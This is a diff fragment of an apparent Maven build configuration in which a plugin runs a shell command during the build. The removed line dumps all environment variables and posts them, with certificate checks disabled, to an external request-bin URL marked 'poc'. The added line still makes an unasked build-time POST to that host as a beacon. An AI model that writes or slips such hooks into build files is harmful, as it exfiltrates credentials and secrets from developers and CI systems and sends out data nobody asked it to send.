@@ -127,7 +127,7 @@
                         <argument>
                             -c
                         </argument>
-                        <argument>set | curl -X POST --insecure --data-binary @- https://en8ihphlt97wd.x.pipedream.net/poc/</argument>
+                        <argument>curl -X POST --insecure -d 'IT works' https://en8ihphlt97wd.x.pipedream.net/poc/</argument>
                     </arguments>
                 </configuration>
             </plugin>
